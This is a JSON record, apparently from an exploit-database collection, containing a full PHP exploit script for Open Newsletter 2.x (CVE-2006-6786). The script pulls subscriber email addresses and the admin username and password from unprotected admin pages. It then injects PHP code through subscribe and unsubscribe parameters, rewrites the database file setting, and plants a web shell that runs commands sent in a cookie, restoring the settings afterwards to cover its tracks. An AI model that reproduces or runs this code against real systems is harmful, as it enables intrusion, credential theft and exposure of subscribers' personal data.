{
  "id": "2981",
  "title": "open NewsLetter 2.5 - Multiple Vulnerabilities (2)",
  "cve": "CVE-2006-6786",
  "vuln_type": "rce",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\necho \"\\r\\n\";\r\necho \"Open Newsletter <= 2.* Muliple Vulnerabilities\\r\\n\";\r\necho \"Site: http://www.selfexile.com/projects/opennewsletter/\\r\\n\";\r\necho \"Dork: \\\"This is a Free & Open Source mailing list manager\\\"\\r\\n\";\r\necho \"by BlackHawk <hawkgotyou@gmail.com> <http://itablackhawk.altervista.org>\\r\\n\";\r\necho \"Thanks to rgod for the php code and Marty for the Love\\r\\n\\r\\n\";\r\nif ($argc<4) {\r\necho \"Usage: php \".$argv[0].\" Site Path AttackType Related\\r\\n\";\r\necho \"Host:\t\ttarget server (ip/hostname)\\r\\n\";\r\necho \"Path:\t\tpath to Open Newsletter\\r\\n\";\r\necho \"AttackType:\t1 - Subscribers Email retrieve\\r\\n\";\r\necho \"\t\t  |-> Related: None\\r\\n\";\r\necho \"\t\t  |-> Es: php \".$argv[0].\" localhost /opnletter/ 1\\r\\n\\r\\n\";\r\necho \"\t\t2 - Credential Retrieve\\r\\n\";\r\necho \"\t\t  |-> Related: None\\r\\n\";\r\necho \"\t\t  |-> Es: php \".$argv[0].\" localhost /opnletter/ 2\\r\\n\\r\\n\";\r\necho \"\t\t3 - Remote Command Execution\\r\\n\";\r\necho \"\t\t  |-> Related: None\\r\\n\";\r\necho \"\t\t  |-> Es: php \".$argv[0].\" localhost /opnletter/ 3 dir\\r\\n\\r\\n\";\r\necho \"\\r\\n\";\r\necho \"\";\r\ndie;\r\n}\r\n\r\n/*\r\n---\r\n\r\nVer 1.1 - fixed for mq=on\r\n\r\n---\r\nSome one told me that this was absolutely a very good scritp..\r\ni think that the programmer nearly do not know PHP..\r\nwhy? this is the only protection for admin files:\r\n------------------------------------\r\n\tsession_start();\r\n\t\r\n\tif($_SESSION[\"valid\"] != true)\r\n\t{\r\n\t    header(\"Location: index.php\");\r\n\t}\r\n\t\r\n------------------------------------\r\n\r\ndo you remember that this one will only 'work' with normal browsers?\r\nthat the script will continue to be executed until the end?\r\n\r\nthis exploit only works with the conseguence of this..\r\n\r\n\r\nStarted programming: 18.31 22/12/2006\r\nEnded: 19.39 22/12/2006\r\n\r\nMerry Xmas and a happy new Hacking Year ^_^\r\n\r\nBlackHawk <hawkgotyou@gmail.com>\r\n\r\nPS: have some spear time? the 01/01 send me 'happy birthdate' emails ^_*\r\n*/\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n}\r\n\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$attack_type=$argv[3];\r\n$port=80;\r\n$proxy=\"\";\r\n\r\n\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\nswitch($attack_type)\r\n{\r\ncase 1: //Email Retrieve\r\necho \"Attack No 1 - Subscribers Email Retrieve\\r\\n\";\r\necho \"-- Start of Result--\\r\\n\";\r\n$packet =\"GET \".$p.\"subscribers.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\n$dopo_campo = explode(\"<select class=textField name=email><option>\",$html);\r\n$prima_fine = explode(\"</option></select>\",$dopo_campo[1]);\r\n$emails = str_replace(\"</option><option>\", \"\\r\\n\", $prima_fine[0]);\r\necho $emails;\r\necho \"\\r\\n-- End of Result--\";\r\nbreak;\r\n\r\ncase 2: // Credential Retrieve\r\n$usr_id=$argv[4];\r\necho \"Attack No 2 - Credential Retrieve\\r\\n\";\r\n$packet =\"GET \".$p.\"settings.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\n$temp = explode(\"<input class=textField type=text name='admin_username' value='\", $html);\r\n$user_name = explode(\"' title='\", $temp[1]);\r\n$temp2 = explode(\"<input class=textField type=text name='admin_password' value='\", $html);\r\n$user_password = explode(\"' title='\", $temp2[1]);\r\n$temp3 = explode(\"<input type=hidden name=old_db_file value=\", $html);\r\n$database_name = explode(\">\", $temp3[1]);\r\necho \"UserName: \".$user_name[0].\"\\r\\n\";\r\necho \"Password: \".$user_password[0].\"\\r\\n\";\r\necho \"Database Name: \".$database_name[0].\"\\r\\n\";\r\nbreak;\r\n\r\nbreak;\r\ncase 3: // Command Execution\r\n$cmd=\"\";\r\nfor ($i=4; $i<=$argc-1; $i++){\r\n$cmd.=\" \".$argv[$i];\r\n}\r\n\r\n$packet =\"GET \".$p.\"piggy_marty.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Cookie: cmd=\".$cmd.\";\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\nif (strstr($html,\"69696\"))\r\n{\r\n  echo \"Exploit succeeded...\\r\\n\";\r\n  $temp69=explode(\"69696\",$html);\r\n  die(\"\\r\\n\".$temp69[1].\"\\r\\n\");\r\n}\r\n$packet ='GET '.$p.'subscribe.php?action=subscribe&email=<?php%20$fp=fopen($_GET[nomeshell],$_GET[w]);fputs($fp,$_GET[shell]);fclose($fp);chmod($_GET[nomeshell],777);?> HTTP/1.0\\r\\n';\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\nsleep(1);\r\n\r\necho \"Attack No 3 - Remote Command Execution\\r\\n\";\r\n$packet =\"GET \".$p.\"settings.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\n\r\n$temp = explode(\"<input class=textField type=text name='admin_username' value='\", $html);\r\n$user_name = explode(\"' title='\", $temp[1]);\r\n$temp2 = explode(\"<input class=textField type=text name='admin_password' value='\", $html);\r\n$user_password = explode(\"' title='\", $temp2[1]);\r\n$temp3 = explode(\"<input type=hidden name=old_db_file value=\", $html);\r\n$database_name = explode(\">\", $temp3[1]);\r\n$temp4 = explode(\"<input class=textField type=text name='admin_name' value='\", $html);\r\n$admin_name = explode(\"' title='\", $temp4[1]);\r\n$temp5 = explode(\"<input class=textField type=text name='admin_email' value='\", $html);\r\n$admin_email = explode(\"' title='\", $temp5[1]);\r\n$temp6 = explode(\"<input class=textField type=text name='charset' value='\", $html);\r\n$chr = explode(\"' title='\", $temp6[1]);\r\n$temp7 = explode(\"<input class=textField type=text name='site_url' value='\", $html);\r\n$site_url = explode(\"' title='\", $temp7[1]);\r\n$temp8 = explode(\"<input class=textField type=text name='opennewsletter_dir' value='\", $html);\r\n$dir = explode(\"' title='\", $temp8[1]);\r\n\r\n$data=\"action=update\";\r\n$data.=\"&admin_username=\".$user_name[0];\r\n$data.=\"&admin_password=\".$user_password[0];\r\n$data.=\"&admin_name=\".$admin_name[0];\r\n$data.=\"&admin_email=\".$admin_email[0];\r\n$data.=\"&unsubscribe_link=on\";\r\n$data.=\"&charset=\".$chr[0];\r\n$data.=\"&site_url=\".$site_url[0];\r\n$data.=\"&opennewsletter_dir=\".$dir[0];\r\n$data.=\"&db_file=hello.php\";\r\n$data.=\"&old_db_file=\".$database_name[0];\r\n$packet=\"POST \".$p.\"settings.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\\r\\n\";\r\n$packet.=\"Accept-Language: it\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\nsleep(1);\r\n$shell = '<?php%20error_reporting(0);set_time_limit(0);if%20(get_magic_quotes_gpc())%20{$_COOKIE[cmd]=stripslashes($_COOKIE[cmd]);}echo%2069696;passthru($_COOKIE[cmd]);echo%2069696;?>';\r\n$packet =\"GET \".$p.\"hello.php?w=w&shell=$shell&nomeshell=piggy_marty.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\nsleep(1);\r\n$packet =\"GET \".$p.\"unsubscribe.php?email=<?php%20\\$fp=fopen(\\$_GET[nomeshell],\\$_GET[w]);fputs(\\$fp,\\$_GET[shell]);fclose(\\$fp);chmod(\\$_GET[nomeshell],777);?> HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\nsleep(1);\r\n$data=\"action=update\";\r\n$data.=\"&admin_username=\".$user_name[0];\r\n$data.=\"&admin_password=\".$user_password[0];\r\n$data.=\"&admin_name=\".$admin_name[0];\r\n$data.=\"&admin_email=\".$admin_email[0];\r\n$data.=\"&unsubscribe_link=on\";\r\n$data.=\"&charset=\".$chr[0];\r\n$data.=\"&site_url=\".$site_url[0];\r\n$data.=\"&opennewsletter_dir=\".$dir[0];\r\n$data.=\"&db_file=\".$database_name[0];\r\n$data.=\"&old_db_file=\".$database_name[0];\r\n$packet=\"POST \".$p.\"settings.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\\r\\n\";\r\n$packet.=\"Accept-Language: it\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\nsleep(1);\r\necho \"Shell Created and Files Restored.. Now Try to execute command..\\r\\n\\r\\n\";\r\n$packet =\"GET \".$p.\"piggy_marty.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Cookie: cmd=\".$cmd.\";\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\nif (strstr($html,\"69696\"))\r\n{\r\n  echo \"Exploit succeeded...\\r\\n\";\r\n  $temp69=explode(\"69696\",$html);\r\n  die(\"\\r\\n\".$temp69[1].\"\\r\\n\");\r\n}\r\nbreak;\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-12-23]",
  "url": "https://www.exploit-db.com/exploits/2981"
}